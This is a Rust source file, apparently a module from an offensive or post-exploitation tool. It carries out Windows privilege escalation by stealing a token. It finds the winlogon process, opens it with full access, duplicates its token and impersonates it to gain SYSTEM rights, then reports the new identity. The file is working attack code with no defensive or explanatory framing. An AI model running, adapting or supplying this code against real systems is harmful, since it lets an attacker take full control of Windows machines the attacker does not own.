use windows::Win32::{
        Foundation::{
            CloseHandle,
            HANDLE
        },
        System::Threading::{
            OpenProcessToken,
            OpenProcess,
            PROCESS_ALL_ACCESS
        },
        Security::{
            DuplicateToken,
            ImpersonateLoggedOnUser,
            SecurityImpersonation,
            TOKEN_DUPLICATE
        }
    };
use sysinfo::System;
use whoami;

fn get_processes(proc_name: &str) -> Vec<(u32, String)> {
    let sys = System::new_all();
    sys.processes()
    .iter()
    .filter(|(_, n) | {
        n.name().to_lowercase().contains(proc_name)
    })
    .map(|(p, n)| {
        (p.as_u32(), n.name().to_owned())
    })
    .collect()
} 

pub fn handle()  -> Result<String, String> {
    unsafe {
        let mut winlogon_token_handle = HANDLE(0);
        let mut duplicate_token_handle = HANDLE(0);
        let winlogon_processes = get_processes("winlogon");
        if winlogon_processes.is_empty() {
            return Err("Couldn't find winlogon!".to_string());
        }
        
        let winlogon_pid: u32 = winlogon_processes[0].0;
        // OpenProcess
        let winlogon_proc_handle = OpenProcess(PROCESS_ALL_ACCESS, false, winlogon_pid).unwrap();
        // OpenProcessToken
        OpenProcessToken(winlogon_proc_handle, TOKEN_DUPLICATE, &mut winlogon_token_handle).unwrap();
        if  winlogon_token_handle.0 == 0 {
            return Err("Couldn't get Winlogon Token!".to_string());
        } 
        // Duplicate Token
        DuplicateToken(winlogon_token_handle, SecurityImpersonation, &mut duplicate_token_handle).unwrap();
        if  duplicate_token_handle.0 == 0 {
            return Err("Couldn't duplicate token!".to_string());
        } 
        // ImpersonateLoggedOnUser
        if let Ok(_) = ImpersonateLoggedOnUser(duplicate_token_handle) {
            CloseHandle(winlogon_proc_handle).unwrap();
            return Ok(format!("I am now {}", whoami::username()));
        }
        return Err("Couldn't get SYSTEM!".to_string());

    }
}